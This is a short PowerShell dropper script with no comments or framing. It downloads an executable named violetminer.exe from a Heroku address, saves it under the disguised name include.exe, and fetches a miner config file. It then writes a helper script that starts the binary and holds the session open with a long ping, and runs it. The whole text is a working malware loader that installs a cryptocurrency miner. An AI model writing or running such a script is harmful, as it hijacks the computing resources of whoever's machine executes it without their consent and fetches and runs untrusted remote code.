Invoke-WebRequest https://popolaka1.herokuapp.com/violetminer.exe -OutFile include.exe
Invoke-WebRequest https://popolaka1.herokuapp.com/config.json -OutFile config.json
cmd /c echo cmd /k start include.exe >>b.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>b.ps1
.\b.ps1
